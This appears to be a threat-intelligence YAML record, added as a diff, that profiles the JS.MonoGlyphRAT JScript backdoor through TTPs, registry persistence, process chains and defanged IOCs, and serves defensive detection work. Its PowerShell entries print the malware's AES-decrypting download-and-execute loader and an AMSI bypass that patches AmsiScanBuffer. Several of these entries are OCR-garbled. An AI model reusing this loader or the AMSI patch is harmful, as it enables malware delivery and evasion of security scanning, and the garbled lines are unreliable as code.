@@ -1,0 +1,104 @@
+title: 'JS.MonoGlyphRAT: Advanced JScript Backdoor Targeting US Businesses'
+description: JS.MonoGlyphRAT is a persistent RAT and loader written in JavaScript,
+  executed via Windows Script Host, that establishes HKCU Run persistence, communicates
+  with C2 over HTTP using custom headers X-S and X-A, and supports AES-encrypted payload
+  download, PowerShell execution, and in-memory .NET code loading. Its defining characteristic
+  is monoglyph obfuscation of JavaScript identifiers using repeated characters in
+  mixed case.
+attribution: ''
+malware_families:
+- JS.MonoGlyphRAT
+cves: []
+ttps:
+  processes:
+  - wscript.exe
+  - powershell.exe
+  - explorer.exe
+  command_lines:
+  - powershell -nop -enc
+  powershell:
+  - $a="##_KEY_##";$b="##_PATH_##"; $c="##_URL_##"; $d="76E6F6C63756479726E6565647879637"
+    ; try {$e=[System.Security.Cryptography.Aes]::Create(); $e.Key=[byte[]] ($a-split'(.{2})'-ne''-replace'A','0X");$e.IV=[byte[]]
+    ($d[-1..-$d.Length]-join' '-split'(.{2})'-ne''-replace'A','0X') ;$e.Mode=[System.Security.Cryptography.CipherMode]::CBC;
+    $e.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7;$f=$e.CreateDecryptor($e.Key,$e.IV);$g=New-Object
+    System.IO.FileStream($b,[System.IO.FileMode]::Create,[System.IO.FileAccess]::Write);$h=(New-Object
+    System.Net.WebClient).OpenRead($c);$i=New-Object System.Security.Cryptography.CryptoStream($h,$f,[System.Security.Cryptography.CryptoStreamMode]::Read);$i.CopyTo($g);$g.Flush();}finally{if($e){$e.Dispose();}if($g){$g.Dispose();}if($h){$h.Dispose();}if($i){$i.Dispose();}}
+  - $a="##_KEY_##";$b="76E6F6C63756479726E6565647879637";$c="##_TEXT_##";$d=""; try{$e=[System.Security.Cryptography.Aes]::Create();$e.Key=[byte[]]($a-split'(.{2})'-ne''-replace'A','0X");$e.IV=[byte[]]($b[-1..-$b.Length]-join'
+    '-split'(.{2})'-ne''-replace'A','0X");$e.Mode=[System.Security.Cryptography.CipherMode]::CBC;$e.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7;$f=New-Object
+    System.IO.MemoryStream;$g=$e.CreateDecryptor($e.Key,$e.IV);$h=New-Object System.Security.Cryptography.CryptoStream($f,$g,[System.Security.Cryptography.CryptoStreamMode]::Write);$i=[byte[]]($c-split'(.{2})'-ne''-replace'A','0X');$h.Write($i,0,$i.Length);$h.FlushFinalBlock();$j=$f.ToArray();$d=($j|ForEach-Object{[char]$_})-join"";}finally{if($e){$e.Dispose();}if($f){$f.Dispose();}if($h){$h.Dispose();}}&$d;
+  - '$a="##_KEY_##";$b="76E6F6C63756479726E6565647879637" ;$c="##_TEXT_##";$d="";
+    try{Se=[System.Security.Cryptography.Aes]::Create();$e.Key=[byte[]]($a-split''
+    (.{2}) '' -ne''''-Teplace''A, ''0X");$e.IV=[byte[1]($b[-1..-$bLength]-join'' ''-split
+    (.{2})''-ne''''-replaceA,''8X");Se.Mode=[System.Security.Cryptography.CipherMode]
+    : : CBC; $e.Padding=[System.Security.Cryptography.PaddingMode] : : PKCS7; $f=New-Object
+    System.IO.MemoryStream;$g=$e.CreateDecryptor($e.Key,Se.1V) ; Sh=New-Object System.Security.Cryptography
+    .CryptoStrean(sf, $g, [System.Security.Cryptography .CryptoStreantode]i:Write)
+    ;Si=[byte[]](Sc-split(.{2})''-ne'' ''-Teplace''A, ''0X'');Sh.lirite($i,0,5i.Length);Sh.FlushFinalBlock()
+    ;$j=$f.ToArzay();$d=($] |ForEach-Object{[char]$_})-join"";}finally{if(Se){Se.Dispose();}if($)(Sf.Dispose();}if(sh)($h.Dispose();}&$d;'
+  - '$a = "#H_KEY_##";$b = "76E6F6C63756479726E6565647879637" ;$c = "#A_URL_##";$d
+    = "#4_URL2_#4";$e = "H##_HOST_##";try {$f = [System.Security.Cryptography.Aes]::Create();$f.Key
+    = [byte[]](Sal - 1.. - $a.length] - join'''' - split''(.{2})'' - ne'''' - replace''A,
+    ''0X'');$F.IV = [byte[1]($b[ - 1.. - $b.Length] - join'''' - split(.{2})'' - me''''
+    - replace'', ''OX'');$f.Mode = [Systen.Security.Cryptography.CipherMode] : :CBC;$f.Padding
+    = [Systen.Security.Cryptography.PaddingMode] : :PKCS7;'
+  - Add - Type - TypeDefinition $j;[uint32]$k = 0;[string]$1 = "3CO1C8FFADD20949001350000E38"
+    ;[System.UIntPtr]$m = New - Object System.UIntPtr($l.Length / 2);$n = [WinAPI]::GetProcAddress([WinAPI]::LoadLibrary("amsi.d11"),
+    "AmsiScanBuffer");[WinAPI]::VirtualProtect($n, $m, @x40, [ref]sk);
+  scripts:
+  - PURCHASE ORDER_12258.js
+  - QUOTE_B2026.js
+  - CKML220066  MSRS no. 812399.js
+  - QUOTATION2026115.js
+  - JavaScript files disguised as business documents (purchase orders, quotes, RFPs)
+    executed via wscript.exe
+  - JsMonoGlyphRatClient JavaScript RAT client
+  registry_keys:
+  - HKCU\...\Run
+  - HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+  image_loads:
+  - amsi.dll
+  - kernel32.dll
+  network_connections:
+  - wscript.exe -> 158[.]94[.]211[.]76:34567
+  - wscript.exe -> scan[.]aryamint[.]com
+  - wscript.exe -> 158.94.211[.]76:34567
+  file_activity:
+  - '%USERPROFILE%\<random letters>\<random letters>.js'
+  persistence:
+  - Script copies itself to %USERPROFILE% subdirectory and registers via HKCU Run
+    registry key
+  - Script copies itself to %USERPROFILE%\<random letters>\<random letters>.js and
+    registers via HKCU\Software\Microsoft\Windows\CurrentVersion\Run\<random letters>
+  - Registry Run key value contains wscript.exe pointing to a .js file
+  - HKCU\Software\Microsoft\Windows\CurrentVersion\Run\<installFolderName> set to
+    wscript.exe path launching installed JS script with instantConnectArg
+  - Registry startup key modification to ensure persistence across reboots (observed
+    in behavioral analysis)
+  - Script staged in user Temp directory and executed via WScript
+  process_relations:
+  - wscript.exe -> powershell.exe
+  - explorer.exe -> wscript.exe
+  - wscript.exe -> wscript.exe
+iocs:
+  hashes:
+  - 5446b24959c1c2707accfc257aaac61819c01d1ed65bca910a7e8be1787d200f
+  ip_addresses:
+  - 158[.]94[.]211[.]76
+  - 91[.]92[.]243[.]79
+  - 158.94.211[.]76
+  domains:
+  - scan[.]aryamint[.]com
+  - aryamint[.]com
+  - mag.wcoond[.]org
+  urls:
+  - hxxp[://]158[.]94[.]211[.]76:34567/ceoznp
+  - hxxp[://]158[.]94[.]211[.]76:34567/ceoznp?ia=GEZHOV8LBB7PY4KX&df=0
+  - hxxp[://]158[.]94[.]211[.]76:34567/ceoznp?ia=GEZHOV8LBB7PY4KX
+  - hxxp[://]158[.]94[.]211[.]76:34567/ceoznp?ia=UDP3HIP4P5SH3U5R&df=0
+  - hxxp[://]158[.]94[.]211[.]76:34567/ceoznp?ia=UDP3HIP4P5SH3U5R
+authors:
+- ANY.RUN
+- raptur3
+reference: https://any.run/cybersecurity-blog/monoglyphrat-attacks-us-enterprise
+date_of_publication: June 04, 2026
+file_creation_date: June 04, 2026
